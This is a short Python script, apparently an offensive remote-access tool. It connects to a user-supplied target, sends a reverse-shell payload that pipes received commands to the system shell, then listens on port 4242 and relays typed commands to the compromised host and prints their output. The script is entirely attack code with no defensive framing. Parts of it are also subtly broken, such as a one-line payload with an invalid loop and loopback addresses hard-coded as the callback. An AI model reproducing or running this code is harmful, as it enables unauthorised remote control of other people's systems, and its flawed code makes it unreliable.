import socket
command = ""
reverse_shell = b"import socket,subprocess,time;time.sleep(5); sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); ip = '127.0.0.1'; port = 4242; sock.connect((ip, port)); while True: data = sock.recv(1024); data = data.decode(); output = subprocess.check_output(data, shell=True); sock.send(output);"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = input("IP Of Target : ")
port = input("Port Of Target : ")
try:
    port = int(port)
except:
    print("Invalid Port Number")
try:
    s.connect((ip, port))
    print("Connected Successfully")
except:
    print("Failed To Connect To Target")
print("Sending Reverse Shell...")
s.send(b"os;"+reverse_shell)
del s
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('127.0.0.1', 4242))
s.listen(0)
conn,addr = s.accept()
print("Connection From " + str(addr))
while command != "exit":
    command = input("Command : ")
    command = command.encode()
    conn.send(command)
    result = conn.recv(1000000000)
    print(result.decode())
input(">>")
